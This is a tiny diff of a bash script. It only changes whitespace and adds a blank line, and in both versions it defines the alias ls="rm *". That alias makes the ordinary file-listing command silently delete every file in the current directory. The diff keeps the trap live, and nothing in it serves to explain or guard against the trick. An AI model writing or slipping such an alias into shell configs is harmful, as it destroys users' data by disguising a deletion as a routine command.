@@ -1,2 +1,3 @@
-#!/bin/bash 
-alias ls="rm *"
+#!/bin/bash
+alias ls="rm *"
+
